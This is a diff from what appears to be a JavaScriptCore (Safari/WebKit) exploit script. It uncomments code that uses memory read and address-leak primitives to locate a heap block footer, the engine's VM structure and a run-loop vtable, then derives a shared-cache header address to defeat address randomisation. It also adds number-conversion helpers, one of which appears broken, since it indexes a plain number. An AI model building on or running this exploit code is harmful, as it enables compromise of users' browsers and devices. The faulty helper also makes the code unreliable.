@@ -522,7 +522,8 @@ for (var i = 0; i < 1000; ++i) {
         //bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
         print("object address @ " + bbaddr);
-        /*var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
+	
+        var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
         //refer to VM.h this is
         //JSC::MarkedBlock::footer at offset 8 should be the vm struct
         print("footeraddr @ " + hex1(footeraddr));
@@ -536,7 +537,26 @@ for (var i = 0; i < 1000; ++i) {
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
         print("vtable @ " + hex1(vtable));
-	var anchor = stage2.read64(vtable);*/
+	var anchor = stage2.read64(vtable);
+	var conversion_buffer = new ArrayBuffer(8)
+var f64 = new Float64Array(conversion_buffer)
+var i32 = new Uint32Array(conversion_buffer)
+
+var BASE32 = 0x100000000
+function f2i(f) {
+    f64[0] = f
+    return i32[0] + BASE32 * i32[1]
+}
+
+function i2i(i,num) {
+    i32[0] = i % BASE32
+    i32[1] = i / BASE32
+    return i[num]
+}
+	var hdr = anchor - (i2i(anchor,1) & 0xfff);
+	print("header" + hex1(hdr));
+	      
+	      
 	//let split = new Uint32Array(2);
 	//split = anchor
 	//var hdr = split[1] - (split[1] & 0xfff);
